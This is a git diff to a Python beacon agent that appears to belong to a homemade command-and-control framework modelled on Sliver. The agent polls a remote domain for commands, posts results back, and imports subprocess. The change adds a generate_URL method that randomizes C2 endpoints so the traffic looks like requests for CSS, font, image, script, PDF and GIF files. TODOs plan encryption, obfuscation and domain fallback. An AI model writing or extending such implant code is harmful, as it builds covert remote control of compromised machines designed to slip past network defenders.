@@ -4,19 +4,12 @@ from os import error
 from sys import stderr
 import time
 import random
+import json
+import os
 from flask import request
 import requests
 import subprocess
 from typing import List
-
-# Honestly probably the smart thing would be to just copy from what they have in sliver, as those are likely mapped to go use cases
-# For now though:
-
-# .css - Key exchange (to be implemented once we add encryption)
-# .png - close session messages
-# .woff - Gets information on a beacon request
-# .js - session messages
-
 
 # TODO: Make it such that the agent sends using a protobuf, rather than a json, using json for now as honestly it is just easier. I ain't trying to be an attacker
 # TODO: Make it so that there is a timer or handler to swtich to an alternate domain if this domain is not response
@@ -164,8 +157,9 @@ class Agent:
             # TODO: This should also have the nonce and have some randomly generated names for the files
             payload = {"commands": commands, "results": results}
 
+            url = self.generate_URL(".css")
             request = self.session.post(
-                f"http://{self.activeDomain}/fjioawejfoew/jfioewajfo/test.css",
+                url,
                 json=payload,
             )
 
@@ -199,10 +193,8 @@ class Agent:
         # TODO: In the future, this request is going to require: encryption, nonce and obfuscation
 
         try:
-            request = self.session.get(
-                # TODO: In the futeu this should be a randomly generated URL and woff file
-                f"http://{self.activeDomain}/jfiowe/jfioewfj/test.woff"
-            )
+            url = self.generate_URL(".woff")
+            request = self.session.get(url)
             request.raise_for_status()
 
             # Otherwise we obtain the available commands
@@ -230,7 +222,7 @@ class Agent:
         if not self.session:
             raise ValueError("No session is being passed for long polling")
 
-        long_poll_request_url = f"http://{self.activeDomain}/foew/fjewoj/test.png"
+        long_poll_request_url = self.generate_URL(".png")
         try:
             request = self.session.get(url=long_poll_request_url)
             request.raise_for_status()
@@ -261,7 +253,7 @@ class Agent:
         if not self.session:
             raise ValueError("No session is being passed for long polling")
 
-        long_poll_results_url = f"http://{self.activeDomain}/foew/fjewoj/test.js"
+        long_poll_results_url = self.generate_URL(".js")
         try:
             payload = {"commands": commands, "results": results}
             request = self.session.post(url=long_poll_results_url, json=payload)
@@ -296,10 +288,8 @@ class Agent:
         # TODO: In the future, this request is going to require: encryption, nonce and obfuscation
 
         try:
-            request = self.session.get(
-                # TODO: In the future this should be randomly generated pdf file
-                f"http://{self.activeDomain}/jfiowe/jfioewfj/test.pdf"
-            )
+            url = self.generate_URL(".pdf")
+            request = self.session.get(url)
             request.raise_for_status()
 
             response = request.json()
@@ -321,7 +311,7 @@ class Agent:
 
     def _send_modification_command_results(self, commands, results):
         self.session = requests.Session()
-        agent_mod__results_url = f"http://{self.activeDomain}/foew/fjewoj/test.gif"
+        agent_mod__results_url = self.generate_URL(".gif")
         try:
             payload = {"commands": commands, "results": results}
             request = self.session.post(url=agent_mod__results_url, json=payload)
@@ -432,6 +422,47 @@ class Agent:
             raise ValueError(f"Unknown modification command: {cmd_type}")
 
         return handlers[cmd_type](cmd_value)
+
+    def generate_URL(self, filetype: str):
+        """
+        Generates a randomized URL using the parameters that are located in agent_config.json
+
+        Args:
+            filetype: the corresponding file extension that should be used for URL generation
+        Returns:
+            str: A randomized URL for the active domain with the specified file type
+        """
+
+        config_path = os.path.join(os.path.dirname(__file__), "agent_config.json")
+
+        try:
+            with open(config_path, "r") as f:
+                config = json.load(f)
+        except FileNotFoundError:
+            raise FileNotFoundError("agent_config.json not found")
+        except json.JSONDecodeError:
+            raise ValueError("Invalid JSON in agent_config.json")
+
+        if filetype not in config["file_extensions"]:
+            raise ValueError(f"File type {filetype} not supported in config")
+
+        # Get configuration for the specified file type
+        file_config = config["file_extensions"][filetype]
+
+        # Build the URL components
+        base_path = random.choice(file_config["paths"])
+        random_segment = random.choice(config["url_extensions"]["random_segments"])
+        filename = random.choice(file_config["filenames"])
+
+        # Construct the path
+        url_path = f"{base_path}/{random_segment}/test{filetype}"
+
+        # Construct the full URL without query parameters
+        full_url = f"http://{self.activeDomain}{url_path}"
+
+        print(f"This is the generated URL{full_url} ")
+
+        return full_url
 
     def remove_domain(self, domain):
         """
